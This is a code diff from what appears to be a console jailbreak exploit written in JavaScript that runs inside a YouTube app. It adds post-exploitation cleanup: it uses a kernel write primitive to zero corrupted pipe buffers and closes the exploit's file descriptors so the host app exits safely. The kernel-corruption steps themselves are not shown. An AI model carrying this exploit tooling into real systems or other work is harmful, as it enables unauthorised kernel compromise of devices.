@@ -1892,7 +1892,45 @@
                 send_notification("Stage 7\nelfldr failed: " + e.message +
                     "\n(jailbreak still complete)");
             } finally {
+                await cleanup_kexp_pipes(S);
                 await cleanup_ipv6_kernel_rw(S);
+            }
+        }
+
+        async function cleanup_kexp_pipes(S) {
+            try {
+                if (!S.kexp_pipes || !S.kexp_pipes.master_rpipe_data) return;
+                S.kwrite64(S.kexp_pipes.master_rpipe_data + 0x00n, 0n);
+                S.kwrite64(S.kexp_pipes.master_rpipe_data + 0x08n, 0n);
+                S.kwrite64(S.kexp_pipes.master_rpipe_data + 0x10n, 0n);
+                S.kwrite64(S.kexp_pipes.master_rpipe_data + 0x18n, 0n);
+                S.kwrite64(S.kexp_pipes.victim_rpipe_data + 0x00n, 0n);
+                S.kwrite64(S.kexp_pipes.victim_rpipe_data + 0x08n, 0n);
+                S.kwrite64(S.kexp_pipes.victim_rpipe_data + 0x10n, 0n);
+                S.kwrite64(S.kexp_pipes.victim_rpipe_data + 0x18n, 0n);
+                await ulog("cleanup: kexp pipe buffers zeroed");
+            } catch (e) {
+                try { await ulog("cleanup_kexp_pipes: failed: " + e.message); } catch (_) { }
+            }
+        }
+
+        async function cleanup_exploit_pipes(S) {
+            try {
+                if (!S.master_pipe_data || !S.victim_pipe_data) {
+                    await ulog("cleanup_exploit_pipes: pipe data not available, skipping");
+                    return;
+                }
+                S.kwrite64(S.master_pipe_data + 0x00n, 0n);
+                S.kwrite64(S.master_pipe_data + 0x08n, 0n);
+                S.kwrite64(S.master_pipe_data + 0x10n, 0n);
+                S.kwrite64(S.master_pipe_data + 0x18n, 0n);
+                S.kwrite64(S.victim_pipe_data + 0x00n, 0n);
+                S.kwrite64(S.victim_pipe_data + 0x08n, 0n);
+                S.kwrite64(S.victim_pipe_data + 0x10n, 0n);
+                S.kwrite64(S.victim_pipe_data + 0x18n, 0n);
+                await ulog("cleanup: exploit pipe buffers zeroed");
+            } catch (e) {
+                try { await ulog("cleanup_exploit_pipes: failed: " + e.message); } catch (_) { }
             }
         }
 
@@ -2047,12 +2085,21 @@
         } catch (e) {
             if (S.kernel_rw_ready && !cleanup_done) {
                 try {
+                    await cleanup_exploit_pipes(S);
                     await cleanup_ipv6_kernel_rw(S);
                     await cleanup_kernel_state(S);
                 } catch (_) { }
             }
             throw e;
         }
+
+        // Success path: neutralize corrupted pipe buffers so YouTube can close safely
+        try {
+            await cleanup_exploit_pipes(S);
+            for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
+                try { syscall(SYSCALL.close, BigInt(fd)); } catch (_) { }
+            }
+        } catch (_) { }
 
         await ulog("=== p2jb complete ===");
 
